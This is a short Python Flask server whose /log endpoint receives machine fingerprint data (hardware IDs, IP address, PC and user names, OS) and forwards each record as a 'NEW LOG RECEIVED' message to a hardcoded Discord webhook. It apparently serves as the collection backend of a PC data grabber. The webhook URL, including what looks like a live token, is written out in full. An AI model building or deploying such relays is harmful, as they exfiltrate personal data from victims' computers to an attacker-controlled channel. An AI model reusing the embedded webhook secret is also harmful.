from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

# 🔥 APNA DISCORD WEBHOOK
WEBHOOK_URL = "https://discord.com/api/webhooks/1486628249042948177/Sd7goOSOTneyDNHerFR5_ZPOHfCbk6rtcz0ei3Hgcd-PxzNCskU-aHFk13AY20GgiOzm"


@app.route("/")
def home():
    return "BKM SERVER RUNNING 🔥"


@app.route("/log", methods=["POST"])
def log():
    try:
        data = request.get_json(force=True)

        print("📥 RECEIVED DATA:", data)

        if not data:
            return jsonify({"error": "No data"}), 400

        # 🔥 SAFE EMBED
        embed = {
            "title": "BKM PC DETAILS",
            "description": "New system data received",
            "color": 65280,
            "fields": []
        }

        # ✅ SAFE FIELD ADD FUNCTION
        def add_field(name, key):
            val = str(data.get(key, "N/A"))
            if not val or val.strip() == "":
                val = "N/A"

            embed["fields"].append({
                "name": name,
                "value": val[:1000],  # limit safe
                "inline": False
            })

        # 📊 ADD ALL DATA
        add_field("HWID", "uuid")
        add_field("CPU", "cpu")
        add_field("BIOS", "bios")
        add_field("BOARD", "board")
        add_field("RAM", "ram")
        add_field("GPU", "gpu")
        add_field("IP", "ip")
        add_field("PC NAME", "pc")
        add_field("USER", "user")
        add_field("OS", "os")

        # 🚀 SEND TO DISCORD
        r = requests.post(
            WEBHOOK_URL,
            json={
                "content": "🔥 NEW LOG RECEIVED",
                "embeds": [embed]
            },
            timeout=10
        )

        print("📤 DISCORD STATUS:", r.status_code)
        print("📤 RESPONSE:", r.text)

        if r.status_code not in [200, 204]:
            return jsonify({"error": "Discord failed", "code": r.status_code}), 500

        return jsonify({"status": "sent"})

    except Exception as e:
        print("❌ ERROR:", e)
        return jsonify({"error": str(e)}), 500


# 🔥 HOSTING (Render compatible)
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
